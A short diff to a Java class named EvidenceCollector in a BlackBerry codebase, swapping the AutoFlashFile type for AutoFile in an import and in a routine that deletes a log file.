@@ -25,7 +25,7 @@ import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.fs.Path;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Check;
@@ -265,7 +265,7 @@ public final class EvidenceCollector implements Singleton {
         //#ifdef DEBUG
         debug.trace("Removing file: " + logName);
         //#endif
-        final AutoFlashFile file = new AutoFlashFile(logName, false);
+        final AutoFile file = new AutoFile(logName, false);
         if (file.exists()) {
             file.delete();
         } else {
